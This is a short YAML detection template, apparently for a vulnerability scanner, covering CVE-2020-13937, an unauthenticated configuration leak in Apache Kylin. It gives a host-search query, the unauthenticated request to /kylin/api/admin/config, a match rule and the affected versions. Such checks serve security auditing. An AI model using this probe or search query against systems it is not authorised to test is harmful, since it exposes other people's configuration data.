name: Apache Kylin 未授权配置泄露 CVE-2020-13937
manual: true
query: app="APACHE-kylin"
transport: http
rules:
  r0:
    request:
      method: GET
      path: /kylin/api/admin/config
      follow_redirects: true
    expression: response.status == 200 && response.body.bcontains(b"config")
expression: r0()
detail:
  author: PeiQi
  links:
  - http://wiki.peiqi.tech
  description: |-
    Apache Kylin有一个restful api会在没有任何认证的情况下暴露配置信息。
    http://xxx.xxx.xxx.xxx/kylin/api/admin/config

    Apahche Kylin 2.x.x
    Apahche Kylin <= 3.1.0
    Apahche Kylin 4.0.0-alpha
  tags: Disclosure of Sensitive Information
